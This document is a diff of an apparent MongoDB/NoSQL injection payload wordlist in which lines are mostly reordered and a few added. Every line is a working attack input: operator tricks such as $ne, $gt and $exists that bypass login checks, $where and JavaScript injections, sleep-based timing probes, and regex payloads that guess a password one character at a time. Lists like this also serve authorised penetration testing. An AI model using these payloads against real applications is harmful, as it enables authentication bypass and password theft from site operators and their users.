@@ -1,74 +1,75 @@
-' && this.password.match(/.*/)//+%00
-' && this.passwordzz.match(/.*/)//+%00
 ' || 'a'=='a
-' } ], $comment:'successful mongodb injection'
-";return(true);var xyz='a
-"{\"$ne\": \"\"}"
-$or: [ {}, { ‘a’: ‘a’, password: ‘’ }], $comment: ‘successful mongodb injection’ }
+0;return true
+';sleep(5000);
+|| 1==1[$ne]=1
+';sleep(5000);'
 $where: '1 == 1'
-'%20%26%26%20this.password.match(/.*/)//+%00
-'%20%26%26%20this.passwordzz.match(/.*/)//+%00
-', $or: [ {}, { 'a':'a
+';sleep(5000);+'
+"{\"$ne\": \"\"}"
 , $where: '1 == 1'
 ', $where: '1 == 1'
-';it=new%20date();do{pt=new%20date();}while(pt-it<5000);
-';return 'a'=='a' && ''=='
-';sleep(5000);
-';sleep(5000);'
-';sleep(5000);+'
-{"username": {"$ne": "foo"}, "password": {"$ne": "bar"} }
-|| 1==1[$ne]=1
-0;return true
 1, $where: '1 == 1'
-admin' && this.password && this.password.match(/.*/)%00
-admin' && this.password && this.password.match(/^a.*$/)%00
-admin' && this.password && this.password.match(/^b.*$/)%00
-admin' && this.password && this.password.match(/^c.*$/)%00
-admin' && this.password && this.password.match(/^duvj.*$/)%00
-admin' && this.password && this.password.match(/^duvj78i3u$/)%00
-admin' && this.password%00
-'admin' && this.password.match(/\d/) || 'a'=='b'
-'admin' && this.password[0] == 'a' || 'a'=='b'
-db.injection.insert({success:1});return 1;db.stores.mapreduce(function() { { emit(1,1
-tolkien’, $or: [ {}, { ‘a’:’a&password=’ } ],$comment:’successful mongodb injection'
 true, $where: '1 == 1'
+', $or: [ {}, { 'a':'a
+";return(true);var xyz='a
+admin'+&&+this.password!='
+admin' && this.password%00
+';return 'a'=='a' && ''=='
+username[$ne]=admin&pass[$lt]=s
+username[$ne]=admin&pass[$gt]=s
+username[$ne]=1$password[$ne]=1
+username[$regex]=.{25}&pass[$ne]=1
 username[$eq]=admin&password[$ne]=1
-username[$eq]=admin&password[$regex]=\b0
-username[$eq]=admin&password[$regex]=\b1
-username[$eq]=admin&password[$regex]=\b2
-username[$eq]=admin&password[$regex]=\b3
-username[$eq]=admin&password[$regex]=\b4
-username[$eq]=admin&password[$regex]=\b5
-username[$eq]=admin&password[$regex]=\b6
-username[$eq]=admin&password[$regex]=\b7
-username[$eq]=admin&password[$regex]=\b8
-username[$eq]=admin&password[$regex]=\b9
-username[$eq]=admin&password[$regex]=\ba
-username[$eq]=admin&password[$regex]=\bb
-username[$eq]=admin&password[$regex]=\bc
-username[$eq]=admin&password[$regex]=\bd
-username[$eq]=admin&password[$regex]=\be
-username[$eq]=admin&password[$regex]=\bf
-username[$eq]=admin&password[$regex]=\bg
-username[$eq]=admin&password[$regex]=\bh
-username[$eq]=admin&password[$regex]=\bi
-username[$eq]=admin&password[$regex]=\bj
-username[$eq]=admin&password[$regex]=\bk
-username[$eq]=admin&password[$regex]=\bl
-username[$eq]=admin&password[$regex]=\bm
-username[$eq]=admin&password[$regex]=\bn
-username[$eq]=admin&password[$regex]=\bo
-username[$eq]=admin&password[$regex]=\bp
-username[$eq]=admin&password[$regex]=\bq
-username[$eq]=admin&password[$regex]=\br
-username[$eq]=admin&password[$regex]=\bs
-username[$eq]=admin&password[$regex]=\bt
-username[$eq]=admin&password[$regex]=\bu
-username[$eq]=admin&password[$regex]=\bv
-username[$eq]=admin&password[$regex]=\bw
-username[$eq]=admin&password[$regex]=\bx
-username[$eq]=admin&password[$regex]=\by
-username[$eq]=admin&password[$regex]=\bz
+' && this.password.match(/.*/)//+%00
+username[$regex]=^adm$password[$ne]=1
+' && this.passwordzz.match(/.*/)//+%00
+username[$eq]=admin&password[$regex]=^r
+username[$eq]=admin&password[$regex]=^s
+username[$eq]=admin&password[$regex]=^t
+username[$eq]=admin&password[$regex]=^u
+username[$eq]=admin&password[$regex]=^v
+username[$eq]=admin&password[$regex]=^w
+username[$ne]=admin&password[$regex]=^l
+username[$eq]=admin&password[$regex]=^y
+username[$eq]=admin&password[$regex]=^z
+username[$eq]=admin&password[$regex]=^x
+username[$ne]=admin&password[$ne]=admin
+username[$ne]=admin&password[$regex]=^0
+username[$ne]=admin&password[$regex]=^1
+username[$ne]=admin&password[$regex]=^2
+username[$ne]=admin&password[$regex]=^3
+username[$ne]=admin&password[$regex]=^4
+username[$ne]=admin&password[$regex]=^5
+username[$ne]=admin&password[$regex]=^6
+username[$ne]=admin&password[$regex]=^7
+username[$ne]=admin&password[$regex]=^8
+username[$ne]=admin&password[$regex]=^9
+username[$ne]=admin&password[$regex]=^a
+username[$ne]=admin&password[$regex]=^b
+username[$ne]=admin&password[$regex]=^c
+username[$ne]=admin&password[$regex]=^d
+username[$ne]=admin&password[$regex]=^e
+username[$ne]=admin&password[$regex]=^f
+username[$ne]=admin&password[$regex]=^g
+username[$ne]=admin&password[$regex]=^h
+username[$ne]=admin&password[$regex]=^i
+username[$ne]=admin&password[$regex]=^j
+username[$ne]=admin&password[$regex]=^k
+username[$ne]=admin&password[$regex]=^m
+username[$ne]=admin&password[$regex]=^n
+username[$ne]=admin&password[$regex]=^o
+username[$ne]=admin&password[$regex]=^p
+username[$ne]=admin&password[$regex]=^q
+username[$ne]=admin&password[$regex]=^r
+username[$ne]=admin&password[$regex]=^s
+username[$ne]=admin&password[$regex]=^t
+username[$ne]=admin&password[$regex]=^u
+username[$ne]=admin&password[$regex]=^v
+username[$ne]=admin&password[$regex]=^w
+username[$ne]=admin&password[$regex]=^x
+username[$ne]=admin&password[$regex]=^y
+username[$ne]=admin&password[$regex]=^z
+username[$regex]=.*&password[$regex]=.*
 username[$eq]=admin&password[$regex]=^0
 username[$eq]=admin&password[$regex]=^1
 username[$eq]=admin&password[$regex]=^2
@@ -96,40 +97,7 @@ username[$eq]=admin&password[$regex]=^n
 username[$eq]=admin&password[$regex]=^o
 username[$eq]=admin&password[$regex]=^p
 username[$eq]=admin&password[$regex]=^q
-username[$eq]=admin&password[$regex]=^r
-username[$eq]=admin&password[$regex]=^s
-username[$eq]=admin&password[$regex]=^t
-username[$eq]=admin&password[$regex]=^u
-username[$eq]=admin&password[$regex]=^v
-username[$eq]=admin&password[$regex]=^w
-username[$eq]=admin&password[$regex]=^x
-username[$eq]=admin&password[$regex]=^y
-username[$eq]=admin&password[$regex]=^z
-username[$exists]=true&password[$exists]=true
-username[$ne]=1$password[$ne]=1
-username[$ne]=admin&pass[$gt]=s
-username[$ne]=admin&pass[$lt]=s
-username[$ne]=admin&password[$ne]=admin
-username[$ne]=admin&password[$regex]=.{1}
-username[$ne]=admin&password[$regex]=.{2}
-username[$ne]=admin&password[$regex]=.{3}
-username[$ne]=admin&password[$regex]=.{4}
-username[$ne]=admin&password[$regex]=.{5}
-username[$ne]=admin&password[$regex]=.{6}
-username[$ne]=admin&password[$regex]=.{7}
-username[$ne]=admin&password[$regex]=.{8}
-username[$ne]=admin&password[$regex]=.{9}
-username[$ne]=admin&password[$regex]=.{10}
-username[$ne]=admin&password[$regex]=.{11}
-username[$ne]=admin&password[$regex]=.{12}
-username[$ne]=admin&password[$regex]=.{13}
-username[$ne]=admin&password[$regex]=.{14}
-username[$ne]=admin&password[$regex]=.{15}
-username[$ne]=admin&password[$regex]=\b0
-username[$ne]=admin&password[$regex]=\b1
-username[$ne]=admin&password[$regex]=\b2
-username[$ne]=admin&password[$regex]=\b3
-username[$ne]=admin&password[$regex]=\b4
+username[$eq]=admin&password[$regex]=\bc
 username[$ne]=admin&password[$regex]=\b5
 username[$ne]=admin&password[$regex]=\b6
 username[$ne]=admin&password[$regex]=\b7
@@ -138,10 +106,43 @@ username[$ne]=admin&password[$regex]=\b9
 username[$ne]=admin&password[$regex]=\ba
 username[$ne]=admin&password[$regex]=\bb
 username[$ne]=admin&password[$regex]=\bc
-username[$ne]=admin&password[$regex]=\bd
 username[$ne]=admin&password[$regex]=\be
 username[$ne]=admin&password[$regex]=\bf
+username[$ne]=admin&password[$regex]=m.*
+username[$ne]=admin&password[$regex]=mdp
 username[$ne]=admin&password[$regex]=\bg
+username[$ne]=admin&password[$regex]=\br
+username[$eq]=admin&password[$regex]=\bv
+username[$eq]=admin&password[$regex]=\b0
+username[$eq]=admin&password[$regex]=\b1
+username[$eq]=admin&password[$regex]=\b2
+username[$eq]=admin&password[$regex]=\b3
+username[$eq]=admin&password[$regex]=\b4
+username[$eq]=admin&password[$regex]=\b5
+username[$eq]=admin&password[$regex]=\b6
+username[$eq]=admin&password[$regex]=\b7
+username[$eq]=admin&password[$regex]=\b8
+username[$eq]=admin&password[$regex]=\b9
+username[$eq]=admin&password[$regex]=\ba
+username[$eq]=admin&password[$regex]=\bb
+username[$eq]=admin&password[$regex]=\bu
+username[$eq]=admin&password[$regex]=\bd
+username[$eq]=admin&password[$regex]=\be
+username[$ne]=admin&password[$regex]=\bv
+username[$eq]=admin&password[$regex]=\bg
+username[$eq]=admin&password[$regex]=\bh
+username[$eq]=admin&password[$regex]=\bi
+username[$eq]=admin&password[$regex]=\bj
+username[$eq]=admin&password[$regex]=\bk
+username[$eq]=admin&password[$regex]=\bl
+username[$eq]=admin&password[$regex]=\bm
+username[$eq]=admin&password[$regex]=\bn
+username[$eq]=admin&password[$regex]=\bo
+username[$eq]=admin&password[$regex]=\bp
+username[$eq]=admin&password[$regex]=\bq
+username[$eq]=admin&password[$regex]=\br
+username[$eq]=admin&password[$regex]=\bs
+username[$eq]=admin&password[$regex]=\bt
 username[$ne]=admin&password[$regex]=\bh
 username[$ne]=admin&password[$regex]=\bi
 username[$ne]=admin&password[$regex]=\bj
@@ -152,59 +153,60 @@ username[$ne]=admin&password[$regex]=\bn
 username[$ne]=admin&password[$regex]=\bo
 username[$ne]=admin&password[$regex]=\bp
 username[$ne]=admin&password[$regex]=\bq
-username[$ne]=admin&password[$regex]=\br
+username[$ne]=admin&password[$regex]=\bd
 username[$ne]=admin&password[$regex]=\bs
 username[$ne]=admin&password[$regex]=\bt
 username[$ne]=admin&password[$regex]=\bu
-username[$ne]=admin&password[$regex]=\bv
+username[$eq]=admin&password[$regex]=\bw
 username[$ne]=admin&password[$regex]=\bw
 username[$ne]=admin&password[$regex]=\bx
 username[$ne]=admin&password[$regex]=\by
 username[$ne]=admin&password[$regex]=\bz
-username[$ne]=admin&password[$regex]=^0
-username[$ne]=admin&password[$regex]=^1
-username[$ne]=admin&password[$regex]=^2
-username[$ne]=admin&password[$regex]=^3
-username[$ne]=admin&password[$regex]=^4
-username[$ne]=admin&password[$regex]=^5
-username[$ne]=admin&password[$regex]=^6
-username[$ne]=admin&password[$regex]=^7
-username[$ne]=admin&password[$regex]=^8
-username[$ne]=admin&password[$regex]=^9
-username[$ne]=admin&password[$regex]=^a
-username[$ne]=admin&password[$regex]=^b
-username[$ne]=admin&password[$regex]=^c
-username[$ne]=admin&password[$regex]=^d
-username[$ne]=admin&password[$regex]=^e
-username[$ne]=admin&password[$regex]=^f
-username[$ne]=admin&password[$regex]=^g
-username[$ne]=admin&password[$regex]=^h
-username[$ne]=admin&password[$regex]=^i
-username[$ne]=admin&password[$regex]=^j
-username[$ne]=admin&password[$regex]=^k
-username[$ne]=admin&password[$regex]=^l
-username[$ne]=admin&password[$regex]=^m
-username[$ne]=admin&password[$regex]=^n
-username[$ne]=admin&password[$regex]=^o
-username[$ne]=admin&password[$regex]=^p
-username[$ne]=admin&password[$regex]=^q
-username[$ne]=admin&password[$regex]=^r
-username[$ne]=admin&password[$regex]=^s
-username[$ne]=admin&password[$regex]=^t
-username[$ne]=admin&password[$regex]=^u
-username[$ne]=admin&password[$regex]=^v
-username[$ne]=admin&password[$regex]=^w
-username[$ne]=admin&password[$regex]=^x
-username[$ne]=admin&password[$regex]=^y
-username[$ne]=admin&password[$regex]=^z
+username[$eq]=admin&password[$regex]=\bz
+username[$eq]=admin&password[$regex]=\by
+username[$eq]=admin&password[$regex]=\bx
+username[$ne]=admin&password[$regex]=\b0
+username[$ne]=admin&password[$regex]=\b1
+username[$eq]=admin&password[$regex]=\bf
+username[$ne]=admin&password[$regex]=\b2
+username[$ne]=admin&password[$regex]=\b3
+username[$ne]=admin&password[$regex]=\b4
+username[$ne]=admin&password[$regex]=.{9}
+username[$ne]=admin&password[$regex]=.{5}
+username[$ne]=admin&password[$regex]=md.*
+username[$ne]=admin&password[$regex]=.{1}
+username[$ne]=admin&password[$regex]=.{2}
+username[$ne]=admin&password[$regex]=.{3}
+username[$ne]=admin&password[$regex]=.{4}
+username[$ne]=admin&password[$regex]=.{6}
+username[$ne]=admin&password[$regex]=.{7}
+username[$ne]=admin&password[$regex]=.{8}
+username[$ne]=admin&password[$regex]=.{14}
+username[$ne]=admin&password[$regex]=.{15}
 username[$ne]=admin&password[$regex]=a.{2}
 username[$ne]=admin&password[$regex]=b.{2}
-username[$ne]=admin&password[$regex]=m.*
 username[$ne]=admin&password[$regex]=m.{2}
-username[$ne]=admin&password[$regex]=md.*
+username[$ne]=admin&password[$regex]=.{10}
+username[$ne]=admin&password[$regex]=.{11}
+username[$ne]=admin&password[$regex]=.{12}
+username[$ne]=admin&password[$regex]=.{13}
 username[$ne]=admin&password[$regex]=md.{1}
-username[$ne]=admin&password[$regex]=mdp
+'%20%26%26%20this.password.match(/.*/)//+%00
+username[$exists]=true&password[$exists]=true
+'%20%26%26%20this.passwordzz.match(/.*/)//+%00
+'admin' && this.password[0] == 'a' || 'a'=='b'
+' } ], $comment:'successful mongodb injection'
+'admin' && this.password.match(/\d/) || 'a'=='b'
+admin' && this.username!=' admin' && this.foo!='
+admin' && this.password && this.password.match(/.*/)%00
+';it=new%20date();do{pt=new%20date();}while(pt-it<5000);
+{"username": {"$ne": "foo"}, "password": {"$ne": "bar"} }
+admin' && this.password && this.password.match(/^a.*$/)%00
+admin' && this.password && this.password.match(/^c.*$/)%00
+admin' && this.password && this.password.match(/^b.*$/)%00
+admin' && this.password && this.password.match(/^duvj.*$/)%00
+admin' && this.password && this.password.match(/^duvj78i3u$/)%00
 username[$nin][admin]=admin&username[$nin][test]=test&pass[$ne]=7
-username[$regex]=.*&password[$regex]=.*
-username[$regex]=.{25}&pass[$ne]=1
-username[$regex]=^adm$password[$ne]=1
+$or: [ {}, { ‘a’: ‘a’, password: ‘’ }], $comment: ‘successful mongodb injection’ }
+tolkien’, $or: [ {}, { ‘a’:’a&password=’ } ],$comment:’successful mongodb injection'
+db.injection.insert({success:1});return 1;db.stores.mapreduce(function() { { emit(1,1
